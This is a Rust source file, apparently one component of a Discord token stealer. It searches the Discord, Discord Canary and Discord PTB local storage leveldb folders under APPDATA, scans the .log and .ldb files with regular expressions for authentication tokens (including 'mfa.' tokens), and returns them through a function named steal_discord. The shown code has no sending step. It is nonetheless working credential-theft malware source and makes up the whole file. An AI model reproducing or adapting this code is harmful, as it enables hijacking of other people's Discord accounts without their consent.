use std::path::{Path, PathBuf};
use std::io::prelude::*;
use std::fs::{self, File};
use std::env::var;
use regex::Regex;

fn path_exists(path: &str) -> bool {
    Path::new(path).exists()
}

fn get_paths() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let path_appdata: String = var("APPDATA").unwrap();
    
    paths.push(path_appdata.clone() + "\\Discord");
    paths.push(path_appdata.clone() + "\\discordcanary");
    paths.push(path_appdata.clone() + "\\discordptb");

    paths
}

fn has_ending(full_string: &str, ending: &str) -> bool {
    let tmp = match Path::new(full_string).extension().and_then(std::ffi::OsStr::to_str) {
        None => "Error",
        Some(value) => value,
    };
    if tmp == ending { return true; }
    false
}

fn search_token(location: PathBuf) -> String {
    let mut file = File::open(location.clone()).unwrap();
    let mut content = Vec::new();

    file.read_to_end(&mut content).unwrap();

    let content_str = String::from_utf8_lossy(&content);

    let regex_one = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]*").unwrap();
    let regex_two = Regex::new(r"mfa\.[\w-]*").unwrap();

    let value = regex_one.find(&content_str);
    let value_two = regex_two.find(&content_str);
    let token = match value {
        None => match value_two {
            None => "Токены не найдены",
            Some(value) => value.as_str()
        },
        Some(value) => value.as_str(),
    };
    token.to_string()
}

fn get_discord_token(path: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let target: String = path.to_owned() + "\\Local Storage\\leveldb";
    let mut token: Vec<String> = Vec::new();
    for entry in fs::read_dir(target)? {
        let entry = entry?;
        let str_path = entry.path();
        if has_ending(str_path.to_str().unwrap(), "log") {
            let tmp = search_token(str_path.clone());
            if tmp == "Токены не найдены" {
                continue
            }
            token.push(tmp);
        }
        if has_ending(str_path.to_str().unwrap(), "ldb") {
            let tmp = search_token(str_path.clone());
            if tmp == "Токены не найдены" {
                continue
            }
            token.push(tmp);
        }
    }
    Ok(token)
}

fn get_tokens() -> Vec<String> {
    let target_location: Vec<String> = get_paths();
    let mut token: Vec<String> = Vec::new();

    for (_, e) in target_location.iter().enumerate() {
        if path_exists(e) {
            token = match get_discord_token(e) {
                Ok(token) => token,
                Err(_) => Vec::new(),
            };
        }
    }
    token
}
pub fn steal_discord() -> Vec<String> {
    get_tokens()
}